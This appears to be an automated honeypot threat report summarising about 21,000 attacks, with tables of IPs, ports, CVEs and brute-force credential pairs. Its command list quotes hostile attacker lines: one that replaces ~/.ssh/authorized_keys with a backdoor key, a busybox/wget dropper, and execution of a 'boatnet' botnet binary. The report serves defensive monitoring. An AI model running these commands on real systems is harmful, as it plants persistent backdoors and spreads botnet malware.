Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-08T16:01:39Z
**Timeframe:** 2025-10-08T15:20:01Z to 2025-10-08T16:00:01Z
**Files Used:**
- agg_log_20251008T152001Z.json
- agg_log_20251008T154001Z.json
- agg_log_20251008T160001Z.json

### Executive Summary

This report summarizes 21,424 attacks recorded across multiple honeypots. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute-force attempts and command execution. A significant number of attacks were also observed on mail (Mailoney) and SMB (Dionaea) services. The top attacking IP addresses originate from a diverse set of networks, with a high concentration of activity from `161.35.44.220`, `170.64.142.60`, and `136.114.75.193`. The most targeted ports were 22 (SSH), 25 (SMTP), and 445 (SMB). Attackers were observed attempting to exploit several vulnerabilities, including older CVEs. A common tactic observed was the attempt to add a malicious SSH key to the `authorized_keys` file for persistent access.

### Detailed Analysis

**Attacks by Honeypot:**
*   **Cowrie:** 13,744
*   **Honeytrap:** 2,270
*   **Suricata:** 1,757
*   **Ciscoasa:** 1,623
*   **Mailoney:** 885
*   **Dionaea:** 835
*   **Sentrypeer:** 160
*   **H0neytr4p:** 52
*   **ConPot:** 24
*   **Redishoneypot:** 20
*   **Tanner:** 17
*   **Adbhoney:** 17
*   **Honeyaml:** 14
*   **ElasticPot:** 4
*   **Ipphoney:** 2

**Top Attacking IPs:**
*   161.35.44.220: 1,419
*   170.64.142.60: 1,342
*   136.114.75.193: 1,252
*   86.54.42.238: 821
*   182.176.149.227: 692
*   46.32.178.94: 673
*   103.149.28.125: 371
*   88.214.50.58: 333
*   212.87.220.20: 333
*   185.213.174.209: 341
*   192.81.208.35: 316
*   200.46.125.168: 312
*   152.32.192.52: 303
*   138.124.20.112: 267
*   185.213.175.140: 268
*   152.32.189.21: 253
*   49.247.35.31: 297
*   107.172.128.223: 189
*   113.192.61.52: 203
*   103.20.122.54: 198

**Top Targeted Ports/Protocols:**
*   22: 2,013
*   25: 890
*   445: 801
*   TCP/5900: 270
*   5060: 160
*   8333: 137
*   23: 152
*   TCP/22: 94
*   5903: 96
*   TCP/1080: 153
*   5901: 71
*   443: 52
*   31337: 40
*   5908: 49
*   5907: 48
*   5909: 48
*   1083: 45
*   9922: 38
*   8888: 20
*   10443: 22

**Most Common CVEs:**
*   CVE-2002-0013 CVE-2002-0012
*   CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
*   CVE-2006-2369
*   CVE-1999-0183
*   CVE-2020-11910
*   CVE-2019-11500 CVE-2019-11500
*   CVE-2021-3449 CVE-2021-3449

**Commands Attempted by Attackers:**
*   uname -a
*   cd ~; chattr -ia .ssh; lockr -ia .ssh
*   lockr -ia .ssh
*   cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
*   cat /proc/cpuinfo | grep name | wc -l
*   free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
*   ls -lh $(which ls)
*   which ls
*   crontab -l
*   w
*   uname -m
*   top
*   uname
*   whoami
*   lscpu | grep Model
*   df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
*   Enter new UNIX password:
*   tftp; wget; /bin/busybox EKDNK
*   cd /data/local/tmp; ...; ./boatnet.arm7 arm7; ...

**Signatures Triggered:**
*   ET SCAN MS Terminal Server Traffic on Non-standard Port
*   ET DROP Dshield Block Listed Source group 1
*   ET DROP Spamhaus DROP Listed Traffic Inbound group 41
*   ET SCAN NMAP -sS window 1024
*   ET HUNTING RDP Authentication Bypass Attempt
*   GPL INFO SOCKS Proxy attempt
*   ET INFO Python aiohttp User-Agent Observed Inbound
*   ET SCAN Potential SSH Scan
*   ET INFO Reserved Internal IP Traffic
*   ET INFO CURL User Agent

**Users / Login Attempts:**
*   345gs5662d34/345gs5662d34
*   sysadmin/sysadmin@1
*   guest/guest12
*   debian/debian2
*   support/2222222222
*   admin/Huawei12#$
*   blank/blank13
*   frappe/frappe@
*   root/3245gs5662d34
*   frappe/3245gs5662d34
*   manager/manager123
*   botuser/botuser!
*   sysadmin/3245gs5662d34
*   dev/dev
*   amir/1234567
*   deploy/deploy1234
*   deploy/3245gs5662d34
*   lab/Passw0rd@123
*   bot/bot1234

**Files Uploaded/Downloaded:**
*   mips: 4

**HTTP User-Agents:**
*   No significant user-agent data was observed in this period.

**SSH Clients and Servers:**
*   No significant SSH client or server data was observed in this period.

**Top Attacker AS Organizations:**
*   No AS organization data was observed in this period.

### Key Observations and Anomalies

*   **High Volume of Automated Attacks:** The sheer volume of attacks and the nature of the commands suggest highly automated scanning and exploitation attempts, likely from botnets.
*   **Focus on SSH:** The Cowrie honeypot's high hit count, combined with the top port being 22, indicates a strong focus on compromising devices via SSH.
*   **Information Gathering:** Many of the executed commands are for system information gathering (`uname`, `lscpu`, `free`, `df`), which is typical reconnaissance behavior.
*   **Persistence Attempts:** A recurring and critical observation is the attempt to add a new SSH public key to the `~/.ssh/authorized_keys` file. This is a common technique for attackers to gain persistent access to a compromised machine. The specific key and associated comment "mdrfckr" were seen repeatedly.
*   **Botnet Activity:** The commands related to downloading and executing `boatnet.arm` files from a hardcoded IP address (`84.200.81.239`) are indicative of botnet propagation.
*   **Mail Service Exploitation:** The significant number of attacks on the Mailoney honeypot, targeting port 25 (SMTP), suggests attempts to exploit mail servers for spam relay or other malicious activities.

This report highlights a persistent and automated threat landscape. The focus on SSH and the use of reconnaissance and persistence techniques are key takeaways for defensive posture improvements.